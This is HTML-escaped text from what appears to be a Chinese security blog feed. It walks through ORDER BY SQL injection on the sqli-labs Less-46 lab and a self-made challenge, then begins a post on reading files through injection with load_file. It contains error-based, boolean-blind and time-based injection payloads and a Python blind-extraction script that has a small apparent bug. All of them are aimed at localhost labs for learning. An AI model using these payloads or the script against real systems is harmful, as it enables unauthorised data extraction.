&lt;h2 id=&#34;常规Order-by注入&#34;&gt;&lt;a href=&#34;#常规Order-by注入&#34; class=&#34;headerlink&#34; title=&#34;常规Order by注入&#34;&gt;&lt;/a&gt;常规Order by注入&lt;/h2&gt;&lt;p&gt;先来看一下Order by注入的原理&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SELECT username, password FROM users order by 1 asc;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这是一个常见的order by使用语句，order by后面的数字1是第1个列的意思(&lt;strong&gt;也可以指定列名&lt;/strong&gt;)，&lt;code&gt;asc&lt;/code&gt;/ &lt;code&gt;desc&lt;/code&gt;指定是升序还是降序。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：在order by后面的不会根据计算的结果来排序。&lt;/p&gt;
&lt;p&gt;这里有以下几种方式来进行测试：&lt;/p&gt;
&lt;h3 id=&#34;order-by-报错注入&#34;&gt;&lt;a href=&#34;#order-by-报错注入&#34; class=&#34;headerlink&#34; title=&#34;order by + 报错注入&#34;&gt;&lt;/a&gt;order by + 报错注入&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by extractvalue(1,concat(0x7e, @@version,0x7e)) 进行报错注入&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;order-by-布尔盲注&#34;&gt;&lt;a href=&#34;#order-by-布尔盲注&#34; class=&#34;headerlink&#34; title=&#34;order by  + 布尔盲注&#34;&gt;&lt;/a&gt;order by  + 布尔盲注&lt;/h3&gt;&lt;p&gt;rand()会返回一个0和1之间的随机数，如果括号内参数被赋值，同一个参数会返回同一个数。&lt;/p&gt;
&lt;p&gt;这里就可以用mid（也就是substr函数）来构造布尔盲注的方式来进行注入&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by rand(mid(version(),1,1)=5)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;order-by-gt-0的数-and-时间盲注方式&#34;&gt;&lt;a href=&#34;#order-by-gt-0的数-and-时间盲注方式&#34; class=&#34;headerlink&#34; title=&#34;order by + (&amp;gt;0的数) +and+时间盲注方式&#34;&gt;&lt;/a&gt;order by + (&amp;gt;0的数) +and+时间盲注方式&lt;/h3&gt;&lt;p&gt;在order by后面的不会根据计算的结果来排序，但是计算还是会运行。&lt;/p&gt;
&lt;p&gt;也就是，当我们的payload有延迟命令的时候，页面还是会延迟的。&lt;/p&gt;
&lt;p&gt;使用and连接时间盲注payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;order by 1 and (if(substr(version(),1,1)=5,0,sleep(5)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里用&lt;code&gt;sqllib-Less46&lt;/code&gt;作为一个学习的例子：&lt;/p&gt;
&lt;p&gt;它的源代码为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$id=$_GET[&amp;#x27;sort&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$sql = &amp;quot;SELECT * FROM users ORDER BY $id&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002115154304.png&#34; alt=&#34;image-20221002115154304&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么可以&lt;code&gt;将这个1替换成查询语句&lt;/code&gt;，因为&lt;code&gt;查询成功&lt;/code&gt;的结果就是&lt;code&gt;返回1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;：如果对上述这一句有疑问，请看下图&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sort = (select 2)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002120406540.png&#34; alt=&#34;image-20221002120406540&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sort = 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002120420706.png&#34; alt=&#34;image-20221002120420706&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sort = 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002120434503.png&#34; alt=&#34;image-20221002120434503&#34;&gt;&lt;/p&gt;
&lt;p&gt;OK，那就可以有&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,version(),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#与下面一句等效&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,version(),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002115341706.png&#34; alt=&#34;image-20221002115341706&#34;&gt;&lt;/p&gt;
&lt;p&gt;读表：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select extractvalue(1,concat(0x7e,(select group_concat(table_name)) from information_schema.tables where table_schema=database(),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#与下面一句等效&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-46/?sort=(select 1 order by extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002115558719.png&#34; alt=&#34;image-20221002115558719&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;另外一种Order-by-注入&#34;&gt;&lt;a href=&#34;#另外一种Order-by-注入&#34; class=&#34;headerlink&#34; title=&#34;另外一种Order by 注入&#34;&gt;&lt;/a&gt;另外一种Order by 注入&lt;/h2&gt;&lt;p&gt;ThreeZh1自己写了一个题来学习这一种order by注入。&lt;/p&gt;
&lt;p&gt;题目过滤了F1g3这个字段名。&lt;code&gt;在id=3时&lt;/code&gt;，F1g3字段存在flag的base16编码。(直接过滤Flag会更好)&lt;/p&gt;
&lt;p&gt;查询语句：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$sql = &amp;quot;SELECT id, F1ag, username FROM this_1s_th3_fiag_tab13 WHERE id = &amp;quot;.$id.&amp;quot;;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;已知：数据库名：user，表名：this_1s_th3_fiag_tab13，字段名：F1ag，列号为2&lt;/p&gt;
&lt;p&gt;因为过滤了F1ag这个字段名，我们不能直接用普通盲注的方式得到F1ag，所以就得使用一种特别的order by盲注。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002120830210.png&#34; alt=&#34;image-20221002120830210&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试报错&#34;&gt;&lt;a href=&#34;#尝试报错&#34; class=&#34;headerlink&#34; title=&#34;尝试报错&#34;&gt;&lt;/a&gt;尝试报错&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个就是错误页面，意味着报错，那么大概率就是不带单引号的整型注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002120931642.png&#34; alt=&#34;image-20221002120931642&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;尝试不报错&#34;&gt;&lt;a href=&#34;#尝试不报错&#34; class=&#34;headerlink&#34; title=&#34;尝试不报错&#34;&gt;&lt;/a&gt;尝试不报错&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;尝试获取列数&#34;&gt;&lt;a href=&#34;#尝试获取列数&#34; class=&#34;headerlink&#34; title=&#34;尝试获取列数&#34;&gt;&lt;/a&gt;尝试获取列数&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 order by 3 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 order by 4 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;获取列数为3&lt;/p&gt;
&lt;h3 id=&#34;尝试获取数据库版本&#34;&gt;&lt;a href=&#34;#尝试获取数据库版本&#34; class=&#34;headerlink&#34; title=&#34;尝试获取数据库版本&#34;&gt;&lt;/a&gt;尝试获取数据库版本&lt;/h3&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: oops,This is not the flag id &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,version() #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,extractvalue(1, concat(0x7e,version(),0x7e)) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;既然，直接报错注入的方式不可行，那么我们换一种思路，用order by&lt;/p&gt;
&lt;p&gt;可以直接用order by 么？&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 order by extractvalue(1, concat(0x7e,version(),0x7e)) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=1 union select 1,2,3 order by extractvalue(1, concat(0x7e,version(),0x7e)) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;???报错&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;服，那就尝试先来排序。由于id=1、id=2时，都不是flag所对应的id，根据题目，我们知道flag在id=3所在行。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id=3 union select 1,2,3 order by 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id=3 union select 4,2,3 order by 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 4 name: 3 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;根据这个差异，我们可以指定&lt;code&gt;按第二列&lt;/code&gt;来排序，并在select里猜测flag的首字符值。这样就可以不使用F1ag这个字段名就把值读出来。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=3 union select 1,&amp;#x27;6&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/threezh1/index.php?id=3 union select 1,&amp;#x27;7&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 3 name: threezh1 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id: 1 name: 3 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;出现差别了，因为这里是首字符不等于’7’才会出现排序不一样，所以flag的第一个字符为’6’。&lt;/p&gt;
&lt;p&gt;按照这个思路，写出脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt; id: 3 &amp;lt;/td&amp;gt; &amp;lt;td&amp;gt; name: threezh1 &amp;lt;/td&amp;gt; &amp;lt;br/&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt; id: 1 &amp;lt;/td&amp;gt; &amp;lt;td&amp;gt; name: 3 &amp;lt;/td&amp;gt; &amp;lt;br/&amp;gt;&amp;lt;/tr&amp;gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/threezh1/index.php?&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;words = &lt;span class=&#34;string&#34;&gt;&amp;quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_flag&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	length = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	flag = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; words:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;id=3 union select 1,&amp;#x27;&amp;#123;0&amp;#125;&amp;#x27;,3 order by 2&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(flag + j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			content = requests.get(url + payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; key &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; content.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				flag = flag + temp &lt;span class=&#34;comment&#34;&gt;#使用上一次保存的字符添加到flag的尾部&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;comment&#34;&gt;#print(flag)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			temp = j &lt;span class=&#34;comment&#34;&gt;#保存这一次的&amp;quot;没有令回包出现变化&amp;quot;的字符（temp保证是最新的字符）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; j == &lt;span class=&#34;string&#34;&gt;&amp;#x27;Z&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			length = i-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;flag is:&amp;quot;&lt;/span&gt;,flag,&lt;span class=&#34;string&#34;&gt;&amp;quot;length is:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(length))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_flag()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002124705182.png&#34; alt=&#34;image-20221002124705182&#34;&gt;&lt;/p&gt;
&lt;p&gt;附上源码查询&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&amp;#x27;6&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;1-6都是这个样子&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002125810127.png&#34; alt=&#34;image-20221002125810127&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select id,F1ag,username from this_1s_th3_fiag_tab13 where id = 3 union select 1,&amp;#x27;7&amp;#x27;,3 order by 2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;到7的时候第一次变化&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002125748813.png&#34; alt=&#34;image-20221002125748813&#34;&gt;&lt;/p&gt;
&lt;p&gt;所以就是要记录何时第一次变化，然后把&lt;code&gt;上一次没有引起回包变化的字符&lt;/code&gt;添加到&lt;strong&gt;flag的尾部&lt;/strong&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/</guid>
            <title>SQL注入读写文件</title>
            <link>https://kiyomijin.github.io/2022/10/02/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6/</link>
            <category>SQL注入探究</category>
            <pubDate>Sun, 02 Oct 2022 00:29:51 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL注入之SQL注入读写文件&#34;&gt;&lt;a href=&#34;#SQL注入之SQL注入读写文件&#34; class=&#34;headerlink&#34; title=&#34;SQL注入之SQL注入读写文件&#34;&gt;&lt;/a&gt;SQL注入之SQL注入读写文件&lt;/h1&gt;&lt;p&gt;本篇讲解SQL注入读写文件&lt;/p&gt;
&lt;p&gt;使用到的函数如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;使用条件：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;A、必须有权限读取并且文件必须完全可读&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;B、欲读取文件必须在服务器上&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;C、必须指定文件完整的路径&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;D、欲读取文件必须小于 max_allowed_packet&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Less-1为例&lt;/p&gt;
&lt;h2 id=&#34;尝试报错&#34;&gt;&lt;a href=&#34;#尝试报错&#34; class=&#34;headerlink&#34; title=&#34;尝试报错&#34;&gt;&lt;/a&gt;尝试报错&lt;/h2&gt;&lt;p&gt;添加一个单引号：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002005100344.png&#34; alt=&#34;image-20221002005100344&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试不报错&#34;&gt;&lt;a href=&#34;#尝试不报错&#34; class=&#34;headerlink&#34; title=&#34;尝试不报错&#34;&gt;&lt;/a&gt;尝试不报错&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27; %23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221002005148813.png&#34; alt=&#34;image-20221002005148813&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;尝试order-by注入&#34;&gt;&lt;a href=&#34;#尝试order-by注入&#34; class=&#34;headerlink&#34; title=&#34;尝试order by注入&#34;&gt;&lt;/a&gt;尝试order by注入&lt;/h2&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27; order by 3 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-1/?id=1&amp;#x27; order by 4 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Unknown column &amp;#x27;4&amp;#x27; in &amp;#x27;order clause&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;读取文件&#34;&gt;&lt;a href=&#34;#读取文件&#34; class=&#34;headerlink&#34; title=&#34;读取文件&#34;&gt;&lt;/a&gt;读取文件&lt;/h2&gt;&lt;p&gt;一般获取服务器的绝对路径有两种方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过经验猜测和自己搭建的服务器同样的路径&lt;/li&gt;
&lt;li&gt;通过爆破手段得到&lt;/li&gt;
&lt;/ul&gt;
